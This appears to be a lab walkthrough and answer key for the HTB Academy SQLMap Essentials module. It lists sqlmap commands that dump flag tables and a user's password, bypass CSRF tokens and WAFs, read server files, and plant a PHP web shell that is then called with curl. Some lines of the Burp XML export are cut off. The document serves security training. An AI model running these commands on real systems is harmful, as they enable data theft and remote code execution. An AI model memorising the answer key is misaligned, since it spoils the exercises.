# [HTB_Academy] SQLMap Essentials


## Running SQLMap on an HTTP Request

>**Q. What's the contents of table flag2? (Case #2)**
```bash
sqlmap 'http://94.237.62.6:47094/case2.php' --data 'id=1' --batch --dump
```
>**Q. What's the contents of table flag3? (Case #3)**
```bash
sqlmap -u "http://94.237.62.6:47094/case3.php" --cookie='id=1*' --batch --dump
```
>**Q. What's the contents of table flag4? (Case #4)**
```xml
<?xml version="1.0"?>
<!DOCTYPE items [
<!ELEMENT items (item*)>
<!ATTLIST items burpVersion CDATA "">
<!ATTLIST items exportTime CDATA "">
<!ELEMENT item (time, url, host, port, protocol, method, path, extension, reque>
<!ELEMENT time (#PCDATA)>
<!ELEMENT url (#PCDATA)>
<!ELEMENT host (#PCDATA)>
<!ATTLIST host ip CDATA "">
<!ELEMENT port (#PCDATA)>
<!ELEMENT protocol (#PCDATA)>
<!ELEMENT method (#PCDATA)>
<!ELEMENT path (#PCDATA)>
<!ELEMENT extension (#PCDATA)>
<!ELEMENT request (#PCDATA)>
<!ATTLIST request base64 (true|false) "false">
<!ELEMENT status (#PCDATA)>
<!ELEMENT responselength (#PCDATA)>
<!ELEMENT mimetype (#PCDATA)>
<!ELEMENT response (#PCDATA)>
<!ATTLIST response base64 (true|false) "false">
<!ELEMENT comment (#PCDATA)>
]>
<items burpVersion="2023.1.2" exportTime="Fri Jul 14 10:53:44 CEST 2023">
  <item>
    <time>Fri Jul 14 10:52:04 CEST 2023</time>
    <url><![CDATA[http://94.237.62.6:47094/case4.php]]></url>
    <host ip="94.237.62.6">94.237.62.6</host>
    <port>47094</port>
    <protocol>http</protocol>
    <method><![CDATA[POST]]></method>
    <path><![CDATA[/case4.php]]></path>
    <extension>php</extension>
    <request base64="true"><![CDATA[UE9TVCAvY2FzZTQucGhwIEhUVFAvMS4xDQpIb3N0OiA>
    <status>200</status>
    <responselength>455</responselength>
    <mimetype>HTML</mimetype>
    <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpEYXRlOiBGcmksIDE0IE>
    <comment></comment>
  </item>
</items>
```

```bash
sqlmap -r case4.txt -p id --dump
```

## Attack Tuning

>**Q. What's the contents of table flag5? (Case #5)**

```bash
sqlmap 'http://94.237.62.6:47094/case5.php?id=1' --batch --dump -T flag5 --no-cast --level=5 --risk=3
```

>**Q. What's the contents of table flag6? (Case #6)**

```bash
sqlmap 'http://94.237.62.6:47094/case6.php?col=id' --prefix='`)' -p col --batch --dump -T flag6 --no-cast --level=5 --risk=3
```

>**Q. What's the contents of table flag7? (Case #7)**

```bash
sqlmap 'http://94.237.62.6:47094/case7.php?id=1' --batch --dump -T flag7 --no-cast --union-cols=5
```

## Database Enumeration

>**Q. What's the contents of table flag1 in the testdb database? (Case #1)**

```bash
sqlmap 'http://94.237.62.6:47094/case1.php?id=1' -p id -D testdb --tables
sqlmap 'http://94.237.62.6:47094/case1.php?id=1' -p id -D testdb -T flag1 --dump
```

## Advanced Database Enumeration

>**Q. What's the name of the column containing "style" in it's name? (Case #1)**

```bash
sqlmap 'http://94.237.62.6:47094/case1.php?id=1' --search -C "style"
```

>**Q. What's the Kimberly user's password? (Case #1)**

```bash
sqlmap 'http://94.237.62.6:47094/case1.php?id=1' --dump -D testdb -T users -C name,password --no-cast
```

## Bypassing Web Application Protections

>**Q. What's the contents of table flag8? (Case #8)**

```bash
sqlmap -u "http://94.237.62.6:47094/case8.php" --data="id=1&t0ken=H9AemyR5JmWEZHQhjzVoyE3Q6gc9VMkaezSfg6qIEs" --csrf-token="t0ken" --batch --dump -T flag8
```
 
>**Q. What's the contents of table flag9? (Case #9)**

```bash
sqlmap -u "http://94.237.62.6:47094/case9.php?id=1&uid=1898023378" --randomize=uid --batch --dump -T flag9
```

>**Q. What's the contents of table flag10? (Case #10)**

```bash
sqlmap -u "http://94.237.62.6:47094/case10.php" --data="id=1" --batch --dump -T flag10 --random-agent
```

>**Q. What's the contents of table flag11? (Case #11)**

```bash
sqlmap -u "http://94.237.62.6:47094/case11.php?id=1" --skip-waf --batch --dump -T flag11 --tamper=between
```

## OS Exploitation

>**Q. Try to use SQLMap to read the file "/var/www/html/flag.txt".**

```bash
sqlmap -u "http://94.237.62.37:45885/?id=1" --file-read "/var/www/html/flag.txt"
cat /home/marcos/.local/share/sqlmap/output/94.237.62.37/files/_var_www_html_flag.txt
```

>**Q. Use SQLMap to get an interactive OS shell on the remote host and try to find another flag within the host.**

```bash
sudo nano shell.php  
```

```php
echo '<?php system($_GET["cmd"]); ?>'
```

```bash
sudo chmod +x shell.php
sqlmap -u "http://94.237.62.37:45885/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
curl http://94.237.62.37:45885/shell.php?cmd=cat+../../../flag.txt
[/htb]$ sqlmap -u "http://www.example.com/?id=1" --os-shell
```

## Skills Assessment

>**Q. What's the contents of table final_flag?**

```bash
sqlmap -r final.txt --batch --dump --no-cast --tamper=between --dbs
sqlmap -r final.txt --batch --dump --no-cast --tamper=between --dbs -D production -T final_flag
```
